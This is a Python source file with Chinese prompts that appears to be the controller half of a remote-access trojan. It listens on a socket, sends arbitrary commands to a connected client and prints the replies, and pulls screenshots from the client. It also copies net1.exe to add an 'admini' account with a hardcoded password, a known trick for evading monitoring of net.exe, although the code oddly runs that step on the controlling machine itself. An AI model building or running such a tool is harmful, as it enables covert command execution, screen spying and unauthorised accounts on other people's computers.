import os
import shutil
import subprocess
import socket


def start_server(host='', port=7897):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)

        print("等待连接...")
        conn, addr = s.accept()
        print("连接已建立：", addr)
        print("目前可用命令: 截图 添加用户")

        try:
            while True:
                data = input('请输入要发送给客户端的数据（输入"exit"退出）：').strip()
                
                if not data:
                    print("空命令，未发送数据")
                    continue
                
                if data == "exit":
                    break

                if data == "截图":
                    conn.sendall(data.encode())
    
                    # 接收图片大小
                    img_size_data = conn.recv(100000).decode()  # 接收图片大小仍然是解码，因为它是字符串
                    img_size = int(img_size_data) if img_size_data.isdigit() else 0
                    print(f"接收图片大小：{img_size} 字节")

                    # 接收图片数据
                    img_data = b""  # 用字节流接收数据
                    while len(img_data) < img_size:
                        packet = conn.recv(100000)  # 接收数据
                        if not packet:
                            break
                        img_data += packet
                    
                    # 保存图片
                    with open("received_screenshot.jpg", "wb") as f:
                        f.write(img_data)
                    print("截图已保存为 received_screenshot.jpg")

                elif data == "添加用户":
                    # 复制 net1.exe 到当前文件夹
                    try:
                        shutil.copy(r"C:\Windows\System32\net1.exe", "net1.exe")
                        print("net1.exe 已复制到当前文件夹。")
                        
                        # 执行命令添加用户
                        add_user_command = "net1 user admini admini /add"
                        subprocess.run(add_user_command, shell=True, check=True)
                        print("用户 admini 已添加 密码:admini")
                    except Exception as e:
                        print(f"执行添加用户操作时发生错误：{e}")

                else:
                    # 发送普通命令
                    conn.sendall(data.encode())
                    received_data = conn.recv(10000000).decode()
                    print("接收到的数据：", received_data)

        except Exception as e:
            print("发生错误：", e)
        finally:
            conn.close()
            print("服务器运行结束。")
